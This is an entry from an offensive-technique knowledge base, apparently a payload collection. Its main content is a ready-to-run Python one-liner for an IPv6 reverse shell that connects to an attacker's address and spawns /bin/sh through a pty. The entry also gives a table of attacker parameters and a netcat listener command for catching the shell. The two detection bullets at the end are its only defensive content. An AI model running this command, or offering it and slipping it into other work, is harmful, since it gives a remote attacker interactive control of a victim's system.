---
id: dd192ba6-db48-4ee5-8f3f-6e43646fb768
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - ipv6
  - pty
validated: true
---

# Python-IPv6-Reverse-Shell-PTY

## Code

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Description

Basic IPv6 reverse shell using AF_INET6 and flow info (0,2) for PTY spawn.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IPV6 | Attacker's IPv6 address | dead:beef:2::125c |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

For IPv6 networks; listener must support IPv6 (e.g., nc -6 -lvnp $PORT).

## Detection

- IPv6 socket creations from Python.
- Outbound IPv6 to non-standard addresses.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
